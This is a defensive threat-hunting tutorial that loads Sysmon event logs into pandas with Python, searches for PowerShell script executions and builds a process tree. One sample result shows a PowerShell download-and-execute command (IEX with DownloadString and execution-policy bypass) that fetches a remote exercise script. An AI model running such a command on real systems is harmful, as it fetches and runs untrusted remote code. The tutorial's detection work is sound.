---
title: "Threat Hunting with sysmon 101 part 4: Loading events in pandas dataframe"
date: 2024-03-26 11:40:00 +0200
categories: Threat_hunting
description: Threat hunting with sysmon 
tags: Threat hunting sysmon Threat-hunting windows logs ELK
published: false
---

In the past article, we used powershell scripting to filter the events and perform basic querying, in this article we will load sysmon logs into python, and explore some powerful queries that we can apply to our data to gain better understanding of it.

# Exporting events to xml
The first step is to export sysmon events from the event log in xml format. This can be done either using get-winevent, or wevtutil. But, it seems that wevtutil is much faster .

This command uses **wevtutil.exe** to dump the logs to **exported-eventlog.xml** file on the desktop in XML format.
```
WEVTUtil query-events "Microsoft-Windows-Sysmon/Operational" /format:xml /e:events > ~/Desktop/exported-eventlog.xml
```
Or, this slower version that uses **Get-WinEvent** powershell command
```
 Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'} |Export-Clixml -Path ~/Desktop/exported-eventlog.xml
```

Make sure to run these commands as admin in order to export the logs properly.

# Loading Events in python
Parsing XML files in python is easy, we just need to know which nodes/attributes are useful for us, this code snipper will load the xml file, iterate over each event, extract some data from each event, and then store load every thing in pandas dataframe.

```
import tabulate
from bs4 import BeautifulSoup
import pandas as pd

with open(r'exported-eventlog.xml', 'r' , encoding='utf16') as f:
    data = f.read()

parsed = BeautifulSoup(data, "xml")

events_list  = []
for event in parsed.find_all('Event'):
    evt_dict ={}
    evt_dict['EventID'] = event.find('EventID').text
    evt_dict['Computer'] = event.find('Computer').text
    evt_dict['EventRecordID'] = event.find('EventRecordID').text
    for j in event.find_all("Data"):
        evt_dict[j['Name']] = j.text
    events_list.append(evt_dict)

df = pd.DataFrame(events_list)
print('Loaded %d events' % len(df))
```

# Use case: Search for execute .ps1 files

```
filtered_df = df[(df['CommandLine'].notna()) & (df['CommandLine'].str.match('.*PoWeRSHeLl.*pS1.*',case=0))][['EventID','ProcessId','Image','CommandLine']]
print(tabulate.tabulate(filtered_df ,headers= filtered_df.columns))
```

```
        EventID    ProcessId  CommandLine
----  ---------  -----------  ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 115          1         3900  powershell.exe  -noexit -ep bypass -command IEX((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/11x256/11x256.github.io/test/assets/exercise/th3/1.ps1'))

9082          1         7464  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noexit -command "try { . \"c:\Users\abdo-pc\AppData\Local\Programs\Microsoft VS Code\resources\app\out\vs\workbench\contrib\terminal\browser\media\shellIntegration.ps1\" } catch {}"

```


# Use case: Create Process Tree
Another thing we can try now is to create a process tree to show the relationships between the processes.
In order to create a process tree, we will need 2 things:
- identify root nodes, these nodes (processes) don't have a parent, this can be either due to missing data, or because thats the first process created by the OS.
- Create list of children of each node: this will allow us to create the parent-child relationship


## The firs step: Prepare the data
In this step will check what nodes are missing from our data ,and we will select a subset of filed to use in the process tree
```
# List to store all the nodes
nodes = []
# Dictionary to identify missing nodes
nodes_guids = {}
for i in df[df['EventID'] == "1" ].itertuples():
    node = {}
    node['Name'] = i.Image.split('\\')[-1]
    node['Cmd'] = i.CommandLine
    node['ProcessGuid'] = i.ProcessGuid
    node['ParentProcessGuid'] = i.ParentProcessGuid
    node['ProcessId'] = i.ProcessId

    nodes.append(node)
    nodes_guids[i.ProcessGuid] = 1 # set the node in the dict as available
```



## The second step: Create the parent-child relationship

```
roots = []
childs = {}

for i in nodes:
    if nodes_guids.get(i['ParentProcessGuid'] , 0 ) == 0:
        roots.append(i)
    else:
        if i['ParentProcessGuid']  not in childs:
            childs[i['ParentProcessGuid'] ] = []
        childs[i['ParentProcessGuid'] ].append(i)


```

This code will create a list of roots, nodes without a parent in our set of data. And it will create a list of childs for each parent

## The third step: Print the tree
Now, we have every thing ready, we just need to print the data using recursion. Recursion is used in order to print the data in the required order, we need to print the root, then the first child, then the first child of the first child, and so on...
```
root
    child 1
        child 1 1
            child 1 1 1
        child 1 2
        child 1 3
            child 1 3 1
            child 1 3 2
    child 2
    child 3 
    ... 
```
Using a for loop to print the data , we will get in weird order for a process tree, which will look like this:
```
root
    child 1
    child 2
    child 3
    child 4
    child 1 1
    child 1 2
    child 3 1
    .... and so on
```

```
def print_node(node, indent =0):
    print(' '*indent , node['Name'] , node['ProcessId'])
    for j in childs.get(node['ProcessGuid'] , []):
        print_node(j, indent=indent+4)
for i in roots:
    print_node(i)

```

Which would print something like this, based on what you choose to print 

```
 mscorsvw.exe 1532
 mscorsvw.exe 5964
 chrome.exe 9320
     chrome.exe 6456
     chrome.exe 7568
     chrome.exe 940
     chrome.exe 10788
     chrome.exe 7448
     chrome.exe 3400
     chrome.exe 7060
     chrome.exe 5292
     chrome.exe 11128
     chrome.exe 4340
     chrome.exe 8556
     chrome.exe 8816
     chrome.exe 2052
     chrome.exe 5896
     chrome.exe 7016
     cmd.exe 5292
         conhost.exe 8224
     chrome.exe 768
     chrome.exe 9288
     chrome.exe 9716
     cmd.exe 4264
         conhost.exe 6736
    ....
```


